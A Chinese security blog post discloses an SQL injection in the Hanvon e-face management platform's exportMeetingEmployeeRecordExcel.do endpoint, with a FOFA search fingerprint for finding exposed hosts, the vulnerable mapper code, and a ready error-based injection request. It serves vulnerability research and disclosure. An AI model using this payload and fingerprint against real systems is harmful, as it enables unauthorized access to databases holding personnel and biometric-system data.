---
title: "汉王e脸通综合管理平台 exportMeetingEmployeeRecordExcel.do SQL注入漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-exportMeetingEmployeeRecordExcel-sqli.html
asset_dir: assets/汉王e脸通综合管理平台-exportmeetingemployeerecordexcel.do-sql注入漏洞
---

# 汉王e脸通综合管理平台 exportMeetingEmployeeRecordExcel.do SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/8/7 08:23
* 572浏览
* [0评论](#comment)
* 47分钟阅读

深入探索

软件

漏洞扫描器

服务器安全服务


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理软件，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `exportMeetingEmployeeRecordExcel.do` 接口存在 [SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可在无需认证的情况下，通过构造恶意请求参数注入恶意 SQL 语句，导致数据库信息泄露、数据篡改甚至系统权限提升，影响系统数据安全和完整性。

SQL注入检测工具

# 影响版本

V1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

深入探索

安全认证考试

Windows安全工具

安全研究报告

直接看 `MobiMeetingAppController` 里关于 `exportMeetingEmployeeRecordExcel` 的实现

```
@ResponseBody
    @RequestMapping(
        value = {"exportMeetingEmployeeRecordExcel.do"},
        method = {RequestMethod.GET}
    )
    public MethodResult exportMeetingEmployeeRecordExcel(@RequestParam(required = true,value = "meetingId") Long meetingId, @RequestParam(required = false,value = "page") Integer page, @RequestParam(required = false,value = "pageSize") Integer pageSize, @RequestParam(required = false,value = "name") String name, @RequestParam(required = false,value = "department") Long department, @RequestParam(required = false,value = "columnKey") String columnKey, @RequestParam(required = false,value = "order") String order, @RequestHeader(required = false,value = "token") String token, @RequestParam(required = false,value = "state") Integer state, HttpServletResponse response) {
        MethodResult methodResult = new MethodResult();
        MethodResult rst = this.getTokenUser(token);
        if (rst.isSuccess()) {
            UserTpm user = (UserTpm)rst.getResult();

            try {
                if (page == null) {
                    page = Constants.DEFAULT_START_PAGE_INDEX;
                }

                if (pageSize == null) {
                    pageSize = 9999;
                }

                MeetingEmployeeParam param = new MeetingEmployeeParam();
                param.setMtId(meetingId);
                param.setMeName(name);
                param.setMeDepartment(department);
                if (state != null) {
                    if (state == 5) {
                        param.setMeLeaveEarly((byte)3);
                    } else if (state == 6) {
                        param.setMeLeaveEarly((byte)1);
                    } else {
                        param.setMeSigninState(state.byteValue());
                    }
                }

                param.setColumnKey(columnKey);
                param.setOrder(order);
                PageHelper.startPage(page, pageSize);
                List<MeetingEmployeeTpm> list = this.meetingAsm.queryMeetingEmployee(param);
                MeetingTpm meeting = this.meetingAsm.getMeetingById(meetingId);
```

深入探索

在线安全工具

VPN服务

漏洞修复方案

和 [汉王e脸通综合管理平台 queryManyPeopleGroupList.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-queryManyPeopleGroupList-sqli.html) 处理逻辑差不多，直接看对应的 mapper xml文件 MeetingEmployeeDsm.xml

代码安全审计

```
<!--查询参会人员列表-->
  <select id="queryMeetingEmployee" parameterType="com.hanvon.iface.tpm.meeting.param.MeetingEmployeeParam" resultMap="ResultMapVO">
    select MME.ID, MME.MT_ID, MME.ME_ID, MME.ME_NUMBER, MME.ME_NAME, MME.ME_SIGNIN_STATE, MME.ME_SIGNIN_TIME,
    MME.ME_SIGNIN_PATH ,SB.SZ_NAME AS MEDEPARTMENTNAME,MME.ME_ISSUE_STATE AS MEISSUESTATE,MME.ME_SIGNOUT_TIME,ME_LEAVE_EARLY,su.sz_photo_path as photoPath
    from mt_meeting_employee MME
    LEFT JOIN SYS_BRANCH SB ON MME.ME_DEPARTMENT = SB.NG_ID
    LEFT JOIN sys_user su on MME.ME_ID =  su.ng_id
    where MME.MT_ID = #{mtId}
    <if test="meName != null and meName != ''">
      and MME.ME_NAME like CONCAT('%',#{meName},'%')
    </if>
    <if test="meDepartment != null">
      and SB.NG_ID = #{meDepartment}
    </if>
    <if test="meSigninState != null">
      and MME.ME_SIGNIN_STATE = #{meSigninState}
    </if>
    <if test="meLeaveEarly != null">
      and MME.ME_LEAVE_EARLY = #{meLeaveEarly}
    </if>
    <if test="meSigninStateList != null">
      and MME.ME_SIGNIN_STATE IN
      <foreach collection="meSigninStateList" item="meSigninStateList" index="index" open="(" separator="," close=")">
        #{meSigninStateList}
      </foreach>
    </if>
    <if test="meDate != null">
      and MME.ME_SIGNIN_TIME &gt; #{meDate,jdbcType=VARCHAR}
    </if>
    ORDER BY
    <if test="order == null or order == ''">
      MME.ME_SIGNIN_TIME desc
    </if>
    <if test="order != null and order != ''">
      ${columnKey} ${order}
    </if>
  </select>
```

用户可控的 `columnKey` 和 `order` 参数未经任何过滤直接拼接到 SQL 语句的 `ORDER BY` 子句中，导致攻击者可构造恶意输入执行任意 SQL 命令，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

> 需要一个合法的 token，参考 [wxLogin.do 信息泄露](https://mrxn.net/jswz/hanvon-efacego-wxLogin-auth-bypass-data-leak.html)获取
>
> 需要 meetingId 参数存在
>
> 漏洞扫描服务

```
GET /manage/mobiMeetingApp/exportMeetingEmployeeRecordExcel.do?begin=&branchId=1&end=&page=1&pageSize=10&year=2025&meetingId=1&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(2920=2920,1)))),8357)) HTTP/1.1
Host: hanvon.mrxn.net
token: xxxxxx
```

[![汉王e脸通综合管理平台 exportMeetingEmployeeRecordExcel.do SQL注入漏洞](images/img-001-8f7276a10f97.webp)](https://image.mrxn.net/77b3864fb3234531a4ebdcb31aa0030b.webp)

成功通过报错注入爆出数据库版本信息

物流软件安全

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#0day](https://mrxn.net/tag/0day)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[汉王e脸通综合管理平台 exportMeetingEmployeeRecordExcel.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-exportMeetingEmployeeRecordExcel-sqli.html)  
文章链接：<https://mrxn.net/jswz/hanvon-efacego-exportMeetingEmployeeRecordExcel-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hanvon-efacego-exportMeetingEmployeeRecordExcel-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

文件大小转换

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALa0lEQVR4Aeyci3LbuBJEdfL//+ybcd9DEUNAlOPEUtXStUizHzNEMFRsKan9dbvdPv5kfbSvVY8We5razwK5qL7Hlad+hvtedd3zpc2WOT35n2AN5Hfd9d+7nMA2kN/TvT2zVhu3duUDN2CzgSmH6PaDcAvV5XvUg3mNvmht5zCvh+gwon062vcM93XbQPbidf26EzgMBMbpQ/jZFmHM+VRYJ4cx1325aJ38Owi5NwR7b4je7wGj3ut6vnNIPYzYc8UPAynxWq87gX8+EJg/FaunTB3GOnWPCkYf0Nq+FyoAw/cre8Fc17f+DL+af9Tvnw/k0c0v73gC3x4I5CnzKRGPt4qy8iF9IJj07zdJHx+fT7wcRl+9EOJBsLT98t4w92Gu73vsr+231757/e2BfHcDV/14AoeBOPWOY9mdmYPd0/XbhpH/lqb/wZizn2EYfXVzMzQD81p9Eea53vssr9+x95H3XPHDQEq81utOYBsI5CmBx9i3Csk7dRi5+e6ri92X668Qcj/gEDnr0X05MPxUBuH6/UYQf6VDfJjjvm4byF68rl93Ar+c+ldxtWX76Heu3hHy9KhD+Fm9fqG1Hcur1fXOIfdUh/CqraVe17XgsV+Zr67rFeIpvwkeBgKZOgT7PiE6BPUhHILqHX1iVnr3If0gaB2EwxF7Rt4RUtvvucp1vXNIPwjqw8jVZ3gYyCx0aT93Ar/g+enVtnyaxNL2q+sw9oeRn+X3veu650tbrWezkD2ZXyEk5/3MyTtC8uYgHEbc112vkP1pvMH19lOWe3Ga8o6Q6Xb9rK7nYd6n5+z78fExfKZlrvvF9UR47l6QHAR7ffWu1XUY8/oijH712C9zhdcrpE7hjdY2EMgUIegEIRyC6v4eOofkVr550ZyoLqpD+kJwpqtZC/Osfs+rizDWm4e5bp1oviOM9RAO3LaB3K6vtziBw09Zfbqdw32awJd/E8Dn50QQtAGEw4j6K3R/hZBas6Xtl/oKYazvOXjs97zcPcgf4fUKeXQ6L/CWA4HxaXDKHd0zJK+vLsLom4Po5tRFmPvmn0FIj1VPiN97mRf/1LfOPiIc77sciE0u/NkT2N6HODVv37k6HKeq9xWEeR+IDkF7nu0H+HyfUjlrID1KqwUjNydWppYckpeXV0u+QhjrzMGoV6++rleIp/UmePgpq+8L5lPtOTkkD0F1n4TO1cWVrw7p2/PlQzwIlrZfveaT//9ftdQ1jHWl1bIHxC+tFoRD0Fx5teQQv7Ra6jO8XiGzU3mhthwIZKruDcJhjubqCdgvdRjrVrq1+h31If3khWbrupa8I6QWgt1f8epZC56rgzEH4RD0PhAOXO/Ub2/2tf2U5b4g05KL9WTsl/oZwryfdfuedQ3zPIx6ZWtBdMCW2ycBm9Auqq5Wk7ef0oCtB9BjW+5gNKHuUUu5rvdLfY/LP7L2oev6505g+ykL+HwqnKBb6BzG3Mpf1ZuH9IHgKg+jD+EQtK7Q3mJptSBZGLG82VrVm4X0kfe8Oow5eMyr7nqF1Cm80Tp8D+l7g0wVgv1pgOi9Tg7xrYNw/Y4QH4LW9Zz6Hs1AauVfRZjXQ/T9PesaokOw368ytbo+49crZHYqL9S2gdQEa7mXut4vdchTAMF9Zn9t/gytgfQzr965Ooz5ysGomS2v1hmvzGxZJ8L8Pvq32+2zTeef4skv20BOcpf9QyewDQQydQiu7t+nDmMeRt7zchGSl4ur+6ubg9TD85/22kOE9JDbWw6P/Z6DMa/f+8r3uA3EogtfewLb+xC34bQgU4agPoy8672++/C43rwIYx7CI